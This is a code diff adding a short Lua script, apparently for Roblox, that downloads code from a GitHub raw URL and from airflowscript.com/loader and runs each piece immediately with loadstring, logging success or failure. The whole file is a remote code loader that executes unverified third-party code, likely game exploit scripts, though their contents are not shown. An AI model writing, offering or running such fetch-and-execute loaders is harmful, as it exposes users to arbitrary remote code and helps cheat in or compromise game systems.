@@ -1,0 +1,21 @@
+-- Load first script
+local success1, result1 = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eren460540/Nabert/main/Naberr"))()
+end)
+
+if success1 then
+    print("First script loaded successfully")
+else
+    warn("First script failed to load: " .. tostring(result1))
+end
+
+-- Load second script
+local success2, result2 = pcall(function()
+    loadstring(game:HttpGet("https://airflowscript.com/loader"))()
+end)
+
+if success2 then
+    print("Second script loaded successfully")
+else
+    warn("Second script failed to load: " .. tostring(result2))
+end
